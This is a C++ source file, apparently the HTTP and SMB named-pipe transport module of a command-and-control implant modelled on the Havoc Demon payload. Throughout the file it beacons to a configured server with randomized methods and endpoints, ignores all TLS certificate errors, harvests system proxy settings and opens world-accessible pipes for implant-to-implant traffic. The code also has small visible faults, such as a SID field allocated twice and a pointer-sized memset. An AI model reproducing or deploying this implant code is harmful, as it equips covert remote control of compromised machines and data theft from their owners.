#include <core/include/network.hpp>
namespace Network {
    namespace Http {

        VOID HttpSendRequest(HINTERNET request, _stream **stream) {

            void *buffer    = { };
            void *download  = { };

            uint32_t read   = 0;
            uint32_t total  = 0;
            uint32_t length = 0;

            do {
                x_assert(Ctx->win32.WinHttpQueryDataAvailable(request, (DWORD*) &length));

                if (!buffer) { buffer = x_malloc(length + 1); }
                if (!download) {
                    download = x_malloc(length + 1);
                }
                else {
                    download = x_realloc(download, total + length + 1);
                }

                x_memset(buffer, 0, length + 1);
                x_assert(Ctx->win32.WinHttpReadData(request, buffer, length, (DWORD*) &read));

                x_memcpy(B_PTR(download) + total, buffer, read);
                x_zerofree(buffer, read);

                total += read;

            } while (length > 0);

            (*stream)           = (_stream*) x_malloc(sizeof(_stream));
            (*stream)->buffer   = B_PTR(download);
            (*stream)->length   = total;

            defer:
        }

        VOID DestroyRequestContext(const _request_context *req_ctx) {

            if (req_ctx) {
                if (req_ctx->req_handle)    { Ctx->win32.WinHttpCloseHandle(req_ctx->req_handle); }
                if (req_ctx->conn_handle)   { Ctx->win32.WinHttpCloseHandle(req_ctx->conn_handle); }

                if (req_ctx->endpoint) {
                    x_memset(req_ctx->endpoint, 0, x_wcslen(req_ctx->endpoint) * sizeof(wchar_t));
                    x_free(req_ctx->endpoint);
                }
            }
        }

        VOID DestroyProxyContext(const _proxy_context *proxy_ctx) {

            if (proxy_ctx) {
                if (proxy_ctx->proxy_config.lpszProxy)          { x_free(proxy_ctx->proxy_config.lpszProxy); }
                if (proxy_ctx->proxy_config.lpszProxyBypass)    { x_free(proxy_ctx->proxy_config.lpszProxyBypass); }
                if (proxy_ctx->proxy_config.lpszAutoConfigUrl)  { x_free(proxy_ctx->proxy_config.lpszAutoConfigUrl); }
            }
        }

        BOOL CreateRequestContext(_request_context *req_ctx) {

            bool success            = true;
            const wchar_t *endpoint = { };

            if (!Ctx->transport.http->handle) {
                x_assert(Ctx->transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
            }

            x_assert(req_ctx->conn_handle = Ctx->win32.WinHttpConnect(Ctx->transport.http->handle, Ctx->transport.http->address, Ctx->transport.http->port, 0));

            if (Ctx->transport.http->endpoints) {
                RANDOM_SELECT(endpoint, Ctx->transport.http->endpoints);

                req_ctx->endpoint = (wchar_t*) x_malloc((x_wcslen(endpoint)+ 1) * sizeof(wchar_t));
                x_memcpy(req_ctx->endpoint, endpoint, (x_wcslen(endpoint) + 1) * sizeof(wchar_t));
            }
            else {
                success_(false);
            }

            Ctx->transport.http->flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
            if (Ctx->transport.b_ssl) {
                Ctx->transport.http->flags |= WINHTTP_FLAG_SECURE;
            }

            x_assert(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, Ctx->transport.http->method, req_ctx->endpoint, nullptr, nullptr, nullptr, Ctx->transport.http->flags));

            defer:
            return success;
        }

        BOOL CreateProxyContext(_proxy_context *const proxy_ctx, const _request_context *const req_ctx) {

            bool success = true;

            if (Ctx->transport.b_proxy) {
                proxy_ctx->proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                proxy_ctx->proxy_info.lpszProxy     = Ctx->transport.http->proxy->address;

                x_assert(Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, &proxy_ctx->proxy_info, sizeof(WINHTTP_PROXY_INFO)));

                if (Ctx->transport.http->proxy->username && Ctx->transport.http->proxy->password) {
                    x_assert(Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_USERNAME, Ctx->transport.http->proxy->username, x_wcslen(Ctx->transport.http->proxy->username)));
                    x_assert(Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->transport.http->proxy->password, x_wcslen(Ctx->transport.http->proxy->password)));
                }
            }
            else if (!Ctx->transport.b_envproxy_check) {
                proxy_ctx->autoproxy.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
                proxy_ctx->autoproxy.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
                proxy_ctx->autoproxy.lpszAutoConfigUrl      = nullptr;
                proxy_ctx->autoproxy.lpvReserved            = nullptr;
                proxy_ctx->autoproxy.dwReserved             = 0;
                proxy_ctx->autoproxy.fAutoLogonIfChallenged = TRUE;

                if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info)) {
                    Ctx->transport.env_proxylen  = sizeof(WINHTTP_PROXY_INFO);
                    Ctx->transport.env_proxy     = x_malloc(Ctx->transport.env_proxylen);

                    x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);
                }
                else {
                    if (Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&proxy_ctx->proxy_config)) {
                        if (proxy_ctx->proxy_config.lpszProxy != nullptr && x_wcslen(proxy_ctx->proxy_config.lpszProxy) != 0) {
                            proxy_ctx->proxy_info.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                            proxy_ctx->proxy_info.lpszProxy         = proxy_ctx->proxy_config.lpszProxy;
                            proxy_ctx->proxy_info.lpszProxyBypass   = proxy_ctx->proxy_config.lpszProxyBypass;

                            Ctx->transport.env_proxylen     = sizeof(WINHTTP_PROXY_INFO);
                            Ctx->transport.env_proxy        = x_malloc(Ctx->transport.env_proxylen);

                            x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);

                            proxy_ctx->proxy_config.lpszProxy       = nullptr;
                            proxy_ctx->proxy_config.lpszProxyBypass = nullptr;
                        }
                        else if (proxy_ctx->proxy_config.lpszAutoConfigUrl != nullptr && x_wcslen(proxy_ctx->proxy_config.lpszAutoConfigUrl) != 0) {
                            proxy_ctx->autoproxy.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
                            proxy_ctx->autoproxy.lpszAutoConfigUrl  = proxy_ctx->proxy_config.lpszAutoConfigUrl;
                            proxy_ctx->autoproxy.dwAutoDetectFlags  = 0;

                            Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info);
                            Ctx->transport.env_proxylen     = sizeof(WINHTTP_PROXY_INFO);
                            Ctx->transport.env_proxy        = x_malloc(Ctx->transport.env_proxylen);

                            x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);
                        }
                    }
                }
                Ctx->transport.b_envproxy_check = true;
            }

            if (Ctx->transport.env_proxy) {
                x_assert(Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, Ctx->transport.env_proxy, Ctx->transport.env_proxylen));
            }

            defer:
            return success;
        }

        VOID HttpCallback(const _stream *const out, _stream **in) {
            // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
            // todo: reverting tokens during http operations

            _proxy_context proxy_ctx = { };
            _request_context req_ctx = { };

            uint32_t status     = 0;
            uint32_t n_status   = sizeof(uint32_t);

            wchar_t *methods[] = {
                (wchar_t*)L"GET",
                (wchar_t*)L"POST"
            };

            RANDOM_SELECT(Ctx->transport.http->method, methods);

            x_assert(CreateRequestContext(&req_ctx));
            x_assert(CreateProxyContext(&proxy_ctx, &req_ctx));

            if (Ctx->transport.b_ssl) {
                Ctx->transport.http->flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

                x_assert(Ctx->win32.WinHttpSetOption(req_ctx.req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->transport.http->flags, sizeof(ULONG)));
            }

            if (Ctx->transport.http->headers) {
                const wchar_t *header   = { };
                uint32_t n_headers      = 0;

                while (true) {
                    if (!(header = Ctx->transport.http->headers[n_headers])) {
                        break;
                    }

                    x_assert(Ctx->win32.WinHttpAddRequestHeaders(req_ctx.req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD));
                    n_headers++;
                }
            }

            x_assert(Ctx->win32.WinHttpSendRequest(req_ctx.req_handle, nullptr, 0, out->buffer, out->length, out->length, 0));
            x_assert(Ctx->win32.WinHttpReceiveResponse(req_ctx.req_handle, nullptr));
            x_assert(Ctx->win32.WinHttpQueryHeaders(req_ctx.req_handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, (DWORD*) &n_status, nullptr));

            if (status != HTTP_STATUS_OK) {
                return_defer(status);
            }

            HttpSendRequest(req_ctx.req_handle, in);

            defer:
            DestroyRequestContext(&req_ctx);
            DestroyProxyContext(&proxy_ctx);
        }
    }

    namespace Smb {

        VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr) {

            if (SmbSecAttr->sid)        { Ctx->win32.FreeSid(SmbSecAttr->sid); SmbSecAttr->sid = nullptr; }
            if (SmbSecAttr->sid_low)    { Ctx->win32.FreeSid(SmbSecAttr->sid_low); SmbSecAttr->sid_low = nullptr; }
            if (SmbSecAttr->p_acl)      { x_free(SmbSecAttr->p_acl); }
            if (SmbSecAttr->sec_desc)   { x_free(SmbSecAttr->sec_desc); }
        }

        VOID SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {

            SID_IDENTIFIER_AUTHORITY sid_auth   = SECURITY_WORLD_SID_AUTHORITY;
            SID_IDENTIFIER_AUTHORITY sid_label  = SECURITY_MANDATORY_LABEL_AUTHORITY;

            EXPLICIT_ACCESSA access = { };
            PACL acl                = { };

            x_memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
            x_memset(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));

            x_assert(Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->sid_low));

            access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
            access.grfInheritance       = NO_INHERITANCE;
            access.grfAccessMode        = SET_ACCESS;

            access.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
            access.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
            access.Trustee.ptstrName    = (LPSTR) SmbSecAttr->sid;

            x_assert(Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl));
            x_assert(Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->sid_low));

            x_assert((SmbSecAttr->p_acl = (PACL) x_malloc(MAX_PATH)));

            x_assert(Ctx->win32.InitializeAcl(SmbSecAttr->p_acl, MAX_PATH, ACL_REVISION_DS));
            x_assert(Ctx->win32.AddMandatoryAce(SmbSecAttr->p_acl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->sid_low));

            x_assert(SmbSecAttr->sec_desc = x_malloc(SECURITY_DESCRIPTOR_MIN_LENGTH));

            x_assert(Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->sec_desc, SECURITY_DESCRIPTOR_REVISION));
            x_assert(Ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->sec_desc, TRUE, acl, FALSE));
            x_assert(Ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->sec_desc, TRUE, SmbSecAttr->p_acl, FALSE));

            defer:
            if (ntstatus == ERROR_SUCCESS) {
                SecAttr->lpSecurityDescriptor   = SmbSecAttr->sec_desc;
                SecAttr->nLength                = sizeof(SECURITY_ATTRIBUTES);
                SecAttr->bInheritHandle         = false;
            }
        }

        BOOL PipeRead(void *const handle, const _stream *in) {

            uint32_t read   = 0;
            uint32_t total  = 0;

            do {
                const auto length = __min((in->length - total), PIPE_BUFFER_MAX);

                if (!Ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, (DWORD*) &read, nullptr)) {
                    if (ntstatus == ERROR_NO_DATA) {
                        return false;
                    }
                }

                total += read;
            }
            while (total < in->length);
            return true;
        }

        BOOL PipeWrite(void *const handle, const _stream *out) {

            uint32_t total = 0;
            uint32_t write = 0;

            do {
                const auto length = __min((out->length - total), PIPE_BUFFER_MAX);

                if (!Ctx->win32.WriteFile(handle, B_PTR(out->buffer) + total, length, (DWORD*) &write, nullptr)) {
                    return false;
                }

                total += write;
            }
            while (total < out->length);
            return true;
        }

        BOOL PipeSend (_stream *out) {

            bool success = true;
            SMB_PIPE_SEC_ATTR smb_sec_attr  = { };
            SECURITY_ATTRIBUTES sec_attr    = { };

            if (!Ctx->transport.pipe_handle) {
                SmbContextInit(&smb_sec_attr, &sec_attr);
                x_assert(Ctx->transport.pipe_handle = Ctx->win32.CreateNamedPipeW(Ctx->transport.pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr));

                SmbContextDestroy(&smb_sec_attr);

                if (!Ctx->win32.ConnectNamedPipe(Ctx->transport.pipe_handle, nullptr)) {
                    Ctx->nt.NtClose(Ctx->transport.pipe_handle);
                    success_(false);
                }
            }

            if (!PipeWrite(Ctx->transport.pipe_handle, out)) {
                if (ntstatus == ERROR_NO_DATA) {

                    if (Ctx->transport.pipe_handle) {
                        Ctx->nt.NtClose(Ctx->transport.pipe_handle);
                    }
                    success_(false);
                }
            }

            defer:
            return success;
        }

        BOOL PipeReceive(_stream** in) {

            bool success        = true;
            uint32_t total      = 0;
            uint32_t peer_id    = 0;
            uint32_t msg_size   = 0;

            if (Ctx->win32.PeekNamedPipe(Ctx->transport.pipe_handle, nullptr, 0, nullptr, (DWORD*) &total, nullptr)) {
                if (total > sizeof(uint32_t) * 2) {

                    x_assert(Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &peer_id, sizeof(uint32_t), (DWORD*) &total, nullptr));

                    if (Ctx->session.peer_id != peer_id) {
                        ntstatus = ERROR_INVALID_PARAMETER;
                        success_(false);
                    }

                    if (!Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &msg_size, sizeof(uint32_t), (DWORD*) &total, nullptr)) {
                        if (ntstatus != ERROR_MORE_DATA) {
                            success_(false);
                        }
                    }

                    if (
                        !(*in = Stream::CreateStream()) || !PipeRead(Ctx->transport.pipe_handle, *in)) {
                        if (*in) {
                            Stream::DestroyStream(*in);
                        }

                        success_(false);
                    }
                }
            }

            defer:
            return success;
        }
    }
}

